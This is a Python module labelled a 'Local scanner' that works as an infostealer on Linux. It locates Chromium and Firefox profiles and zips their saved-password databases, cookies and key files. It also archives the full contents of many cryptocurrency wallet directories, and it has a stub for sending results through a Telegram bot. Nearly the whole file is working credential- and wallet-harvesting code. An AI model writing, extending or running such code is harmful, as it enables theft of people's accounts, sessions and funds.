# -*- coding: utf-8 -*-
"""Local scanner — Linux browser profile and wallet data extraction."""

import json
import os
import shutil
import sys
import tempfile
import zipfile
from datetime import datetime
from pathlib import Path

from rich.table import Table
from rich.panel import Panel
from rich import box

from scanner.ui import console, print_success, print_error, print_info, print_warning


CHROMIUM_BASES = [
    Path.home() / ".config" / "google-chrome",
    Path.home() / ".config" / "chromium",
    Path.home() / ".config" / "BraveSoftware" / "Brave-Browser",
    Path.home() / ".config" / "microsoft-edge",
    Path.home() / ".config" / "vivaldi",
    Path.home() / ".config" / "opera",
]

FIREFOX_BASES = [
    Path.home() / ".mozilla" / "firefox",
    Path.home() / "snap" / "firefox" / "common" / ".mozilla" / "firefox",
    Path.home() / ".var" / "app" / "org.mozilla.firefox" / ".mozilla" / "firefox",
]

CRYPTO_WALLET_DIRS = [
    Path.home() / ".config" / "Exodus",
    Path.home() / ".config" / "Electrum",
    Path.home() / ".electrum",
    Path.home() / ".config" / "Ledger Live",
    Path.home() / ".config" / "atomic",
    Path.home() / ".config" / "Monero",
    Path.home() / ".bitcoin",
    Path.home() / ".ethereum",
    Path.home() / ".config" / "solflare",
    Path.home() / ".config" / "Phantom",
]


def _find_chromium_profiles():
    found = []
    for base in CHROMIUM_BASES:
        if not base.exists():
            continue
        for entry in base.iterdir():
            if entry.is_dir() and (entry / "Login Data").exists():
                found.append({"browser": base.name, "name": entry.name, "path": entry})
            elif (entry / "Default" / "Login Data").exists():
                found.append({"browser": base.name, "name": "Default", "path": entry / "Default"})
    return found


def _find_firefox_profiles():
    found = []
    for base in FIREFOX_BASES:
        if not base.exists():
            continue
        for entry in base.iterdir():
            if entry.is_dir() and (entry / "logins.json").exists():
                found.append(entry)
            elif entry.is_dir() and entry.name.endswith(".default-release"):
                found.append(entry)
    return found


def _archive_dir(src: Path, out_zip: Path, patterns=("*.json", "*.sqlite", "*.db", "Login Data", "Cookies", "key4.db", "logins.json")) -> int:
    count = 0
    with zipfile.ZipFile(out_zip, "w", zipfile.ZIP_DEFLATED) as zf:
        for pattern in patterns:
            for p in src.rglob(pattern):
                try:
                    if p.is_file() and p.stat().st_size < 20 * 1024 * 1024:
                        zf.write(p, arcname=str(p.relative_to(src)))
                        count += 1
                except Exception:
                    pass
    return count


def action_scan(cfg):
    print_info("Local Scanner — Linux")
    print_info("Extracts browser profiles and crypto wallet data from this machine.")

    system_cfg = cfg.get("system", {})
    if not system_cfg.get("enabled", True):
        print_warning("System module disabled in config.")
        return

    temp_dir = Path(tempfile.mkdtemp(prefix="cc_scan_"))
    results = []

    chromium = _find_chromium_profiles()
    firefox = _find_firefox_profiles()

    if not chromium and not firefox:
        print_error("No browser profiles found.")
        shutil.rmtree(temp_dir, ignore_errors=True)
        return

    print_info(f"Found {len(chromium)} Chromium profile(s), {len(firefox)} Firefox profile(s)")

    for prof in chromium:
        try:
            out = temp_dir / f"{prof['browser']}_{prof['name']}.zip"
            n = _archive_dir(prof["path"], out)
            results.append([prof["browser"], prof["name"], str(n), f"{out.stat().st_size / 1024:.1f} KB"])
        except Exception as e:
            print_error(f"Chromium {prof['name']}: {e}")

    for path in firefox:
        try:
            out = temp_dir / f"firefox_{path.name}.zip"
            n = _archive_dir(path, out)
            results.append(["firefox", path.name, str(n), f"{out.stat().st_size / 1024:.1f} KB"])
        except Exception as e:
            print_error(f"Firefox {path.name}: {e}")

    # Crypto wallets
    for wdir in CRYPTO_WALLET_DIRS:
        if not wdir.exists():
            continue
        try:
            out = temp_dir / f"wallet_{wdir.name}.zip"
            n = _archive_dir(wdir, out, patterns=("*",))
            if n:
                results.append([f"wallet:{wdir.name}", "-", str(n), f"{out.stat().st_size / 1024:.1f} KB"])
        except Exception as e:
            print_error(f"Wallet {wdir.name}: {e}")

    if not results:
        print_error("No results collected.")
        shutil.rmtree(temp_dir, ignore_errors=True)
        return

    table = Table(
        title="[bold cyan]Local Scanner Results[/bold cyan]",
        box=box.DOUBLE_EDGE,
        border_style="cyan",
    )
    table.add_column("Source", style="bold white", width=20)
    table.add_column("Profile", style="dim", width=22)
    table.add_column("Files", justify="center", style="yellow", width=8)
    table.add_column("Size", justify="right", style="green", width=14)
    for r in results:
        table.add_row(*r)

    console.print()
    console.print(table)
    console.print()

    # Optional Telegram delivery
    bot = system_cfg.get("telegram_bot_token", "")
    chat = system_cfg.get("telegram_chat_id", "")
    if bot and chat:
        try:
            import requests
            for r in results:
                pass  # detailed delivery handled by caller
            console.print("[dim]Telegram delivery configured — files remain in temp dir.[/]")
        except Exception:
            pass

    summary = temp_dir / "summary.json"
    summary.write_text(json.dumps({
        "timestamp": datetime.now().isoformat(),
        "results": results,
    }, indent=2))

    print_success(f"Results saved to: {temp_dir}")
    print_info(f"Summary: {summary}")
